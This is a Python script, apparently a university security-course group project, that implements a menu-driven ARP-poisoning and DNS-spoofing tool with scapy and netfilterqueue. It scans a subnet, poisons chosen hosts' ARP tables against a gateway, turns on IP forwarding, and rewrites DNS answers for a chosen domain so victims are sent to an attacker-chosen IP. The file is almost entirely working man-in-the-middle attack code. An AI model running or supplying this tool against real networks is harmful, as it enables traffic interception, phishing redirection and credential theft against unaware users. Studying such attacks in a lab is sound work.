import sys, os, argparse, re, threading, time
import netfilterqueue
from scapy.all import *

# Global variables
redirect_ip = ""
domain_name = ""

IP_MAC_PAIRS = []

# 1) NETWORK DISCOVERY

# Network Discovery of local subnet and network.
# E.g. IP: a.b.c.d. for a single host
# E.g. IP: x.y.z.1/24 for a range of hosts (scanning 254 potential hosts, x.y.z.1 to x.y.z.254)
def network_scan():
    global IP_MAC_PAIRS

    # Display available network interfaces    
    print("Found interfaces: ")
    interfaces = get_if_list()
    for i in range(len(interfaces)):
        print(str(i) + ") " + interfaces[i])
    
    # Query user to input an interface of choice
    user_input = input("\nChoose interface (e.g. 0): ")
    network = interfaces[user_input]
    print("You selected: " + network)

    # Query user for IP range, and send out a broadcast message on network
    target_subnet = raw_input("\nEnter an IP range (e.g. x.y.z.1/24): ")   
    response, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_subnet), timeout=2, verbose=False, iface=network)
    
    IP_MAC_PAIRS = []    
    for elem in response:
        result = {"ip": elem[1].psrc, "mac": elem[1].hwsrc}
        IP_MAC_PAIRS.append(result)
    
    # Print available hosts on chosen network
    print("Found hosts: ")
    counter = 0
    for result in IP_MAC_PAIRS:
        print(str(counter) + ") " + IP_MAC_PAIRS[counter]["ip"] + "\t\t" + IP_MAC_PAIRS[counter]["mac"])
        counter+=1


# 2) ARP SPOOF

# Spoof Target's ARP table w/ attacker MAC.
# Makes it look like target received a packet from spoof_ip
def send_arp_packet(target_ip, spoof_ip):
    packet = ARP(pdst=target_ip, hwdst=getmacbyip(target_ip), psrc=spoof_ip)

    send(packet, verbose=False)

# ARP Spoof script.
# Queries user for information, after which send_arp_packet() will be called for the poison.
# Allows for multiple hosts to be poisoned w.r.t. a spoof IP
def arp_spoof():
    host_indices = raw_input("What hosts would you like to poison (separated by space, e.g. \"2 3\")? ").split(" ")
    server_index = raw_input("What server(/gateway) would you like to use? ")
    server = IP_MAC_PAIRS[int(server_index)]["ip"]

    # In case of a single host, spoof it.
    if len(host_indices) == 1:
        host = IP_MAC_PAIRS[int(host_indices[0])]["ip"]
        send_arp_packet(host, server)
    else: # In case of multiple hosts, spoof each of them w.r.t. server
        for i in host_indices:
            host = IP_MAC_PAIRS[int(i)]["ip"]
            send_arp_packet(host, server)

        print("\n\n")


#3) DNS SPOOF

# DNS Spoof script.
# Queries user for information, captures outgoing packets, and sets up a persistent ARP spoof.
def dns_spoof():
    global redirect_ip
    global domain_name

    ip_gateway = ""
    ip_victim = ""

    # Enabling IP forwarding on attacker machine
    # + adding an iptables rule to trap packets to use scapy for packet manipulation
    os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward") # Sets ip_forward to 1
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 1")

    # User inputs
    ip_victim = raw_input("Victim IP: ")
    ip_gateway = raw_input("Gateway IP: ")
    domain_name = raw_input("Domain name to spoof: ")
    redirect_ip = raw_input("IP address to redirect domain to: ")

    # Start up a thread spoofing every "interval" number of times
    interval = 4
    arp_spoof_thread = threading.Thread(target=persistent_spoof, args=(ip_gateway, ip_victim, interval))
    arp_spoof_thread.daemon = True
    arp_spoof_thread.start()

    # Start up the packet capture queue in a separate thread
    queue_thread = threading.Thread(target=netfilter_queue)
    queue_thread.daemon = True
    queue_thread.start()

    print("\n" + domain_name + " is now spoofed to redirect to " + redirect_ip)


# Continuously sends packets to victim.
# Also performs a "reverse spoof": spoofs both directions of given parameters
# Waits "interval" number of seconds before resending packet
def persistent_spoof(ip_gate, ip_victim, interval):
    while True:
        # Double spoof w.r.t. gateway + victim
        send_arp_packet(ip_gate, ip_victim)
        send_arp_packet(ip_victim, ip_gate)
        time.sleep(interval)

# Create queue to trap packets
def netfilter_queue():
    # Set up queue to capture packets
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(1, process_packet) # When packet is captured, process_packet() will be used as callback
    queue.run()


# Packet modification to ensure the attack works correctly
def process_packet(packet):
    
    # Convert NFQueue packet to Scapy packet
    packet_payload = IP(packet.get_payload())

    if packet_payload.haslayer(DNSRR):
        qname = packet_payload[DNSQR].qname
        if domain_name in qname.decode(): # If qname is the domain we want to spoof, perform manipulation.
            
            # Sending a DNSRR packet to the victim, and manipulating             
            # Manipulate IP in response to redirect_ip
            packet_payload[DNS].an = DNSRR(rrname=qname, rdata=redirect_ip)
            packet_payload[DNS].ancount = 1

            # Deleting fields to prevent detection of packet corruption
            del packet_payload[IP].len
            del packet_payload[UDP].len

            del packet_payload[IP].chksum
            del packet_payload[UDP].chksum

            packet.set_payload(bytes(packet_payload))
    
    packet.accept()


# START MAIN SCRIPT
print("2IC80: Tool by Group 8 (Roy)")

while True:
    print("")
    print("Do you wish to perform an ARP or DNS spoof?")
    print("1) Network Discovery")
    print("2) ARP Poison")
    print("3) DNS Poison")
    print("4) Quit")
    
    # Simple switch between UI options
    choice = raw_input("-> ")
    option = ""
    
    if choice == "1":
        option = "Network Discovery"
    elif choice == "2":
        option = "ARP Poison"
    elif choice == "3":
        option = "DNS Poison"
    elif choice == "4":
        option = "Quit"
    
    
    print("\nYou have selected \"" + option + "\" \n")


    if choice == "4":
        # Remove any IP tables redirects
        try:
            os.system(
                "iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080"
            )
        except:
            pass

        try:
            # Delete iptables rule that forwards packets to Queue
            os.system("iptables -D FORWARD -j NFQUEUE --queue-num 1")
        except:
            pass

        break
    elif choice == "1":
        # Perform Network Discovery
        network_scan()
    elif choice == "2":
        # Perform ARP spoof
        arp_spoof()
    elif choice == "3":
        # Perform DNS spoof
        dns_spoof()
